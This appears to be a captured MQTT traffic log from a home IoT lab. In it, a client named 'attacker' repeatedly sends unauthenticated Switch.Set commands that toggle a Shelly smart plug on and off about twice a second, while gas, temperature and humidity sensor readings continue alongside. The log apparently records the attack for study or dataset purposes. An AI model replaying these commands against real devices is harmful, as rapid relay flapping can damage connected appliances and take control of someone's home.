2026-04-22T16:40:05,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:05,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5554 34538.143 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:05,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:05,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:40:05,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:40:05,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34538.14,""swi"
2026-04-22T16:40:05,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5555 34538.161 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:05,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:05,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:05,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5556 34538.643 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:05,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:05,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34538.64,""swi"
2026-04-22T16:40:05,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5557 34538.660 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:06,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:06,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:06,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5558 34539.144 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:06,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:06,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34539.14,""swi"
2026-04-22T16:40:06,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5559 34539.163 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:06,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:06,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:06,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5560 34539.644 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:06,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:06,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34539.64,""swi"
2026-04-22T16:40:06,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5561 34539.660 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:06,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:40:06,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:40:06,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:40:06,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:40:06,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:40:07,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:07,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:07,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5562 34540.145 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:07,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:07,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34540.14,""swi"
2026-04-22T16:40:07,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5563 34540.164 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:07,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:07,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:07,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5564 34540.646 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:07,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:07,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34540.64,""swi"
2026-04-22T16:40:07,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5565 34540.663 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:08,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:08,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:08,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5566 34541.147 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:08,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:08,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34541.14,""swi"
2026-04-22T16:40:08,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5567 34541.166 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:08,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:08,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:08,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5568 34541.647 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:08,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:08,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34541.64,""swi"
2026-04-22T16:40:08,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5569 34541.664 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:09,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:09,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:09,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5570 34542.148 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:09,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:09,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34542.14,""swi"
2026-04-22T16:40:09,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5571 34542.167 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:09,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:09,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:09,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5572 34542.648 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:09,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:09,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34542.65,""swi"
2026-04-22T16:40:09,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5573 34542.665 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:10,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:10,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:10,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5574 34543.149 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:10,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:10,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34543.15,""swi"
2026-04-22T16:40:10,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:40:10,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5575 34543.168 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:10,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:40:10,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:10,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:10,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5576 34543.650 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:10,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:10,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34543.65,""swi"
2026-04-22T16:40:10,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5577 34543.666 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:11,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:11,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:11,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5578 34544.150 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:11,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:11,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34544.15,""swi"
2026-04-22T16:40:11,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5579 34544.169 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:11,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:11,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:11,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5580 34544.650 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:11,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:11,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34544.65,""swi"
2026-04-22T16:40:11,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5581 34544.667 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:12,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:12,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:12,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5582 34545.152 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:12,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:12,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34545.15,""swi"
2026-04-22T16:40:12,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5583 34545.171 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:12,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:12,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:12,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5584 34545.651 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:12,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:12,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34545.65,""swi"
2026-04-22T16:40:12,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5585 34545.668 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:13,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:13,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:13,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5586 34546.151 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:13,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:13,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34546.15,""swi"
2026-04-22T16:40:13,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5587 34546.170 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:13,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:13,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:13,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5588 34546.652 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:13,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:13,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34546.65,""swi"
2026-04-22T16:40:13,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5589 34546.669 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:14,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:14,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:14,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5590 34547.153 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:14,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:14,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34547.15,""swi"
2026-04-22T16:40:14,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5591 34547.171 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:14,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:14,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:14,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5592 34547.654 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:14,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:14,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34547.65,""swi"
2026-04-22T16:40:14,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5593 34547.670 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:15,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:15,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:15,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5594 34548.160 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:15,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:40:15,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:15,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34548.16,""swi"
2026-04-22T16:40:15,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5595 34548.179 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:15,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:40:15,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:15,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:15,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5596 34548.655 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:15,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:15,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34548.65,""swi"
2026-04-22T16:40:15,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5597 34548.671 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:16,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:16,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:16,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5598 34549.155 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:16,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:16,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34549.15,""swi"
2026-04-22T16:40:16,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5599 34549.174 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:16,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:16,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:16,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5600 34549.658 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:16,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:16,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34549.65,""swi"
2026-04-22T16:40:16,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5601 34549.674 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:16,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:40:16,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:40:16,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:40:16,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:40:16,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:40:17,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:17,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:17,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5602 34550.156 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:17,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:17,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34550.15,""swi"
2026-04-22T16:40:17,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5603 34550.174 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:17,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:17,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:17,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5604 34550.656 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:17,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
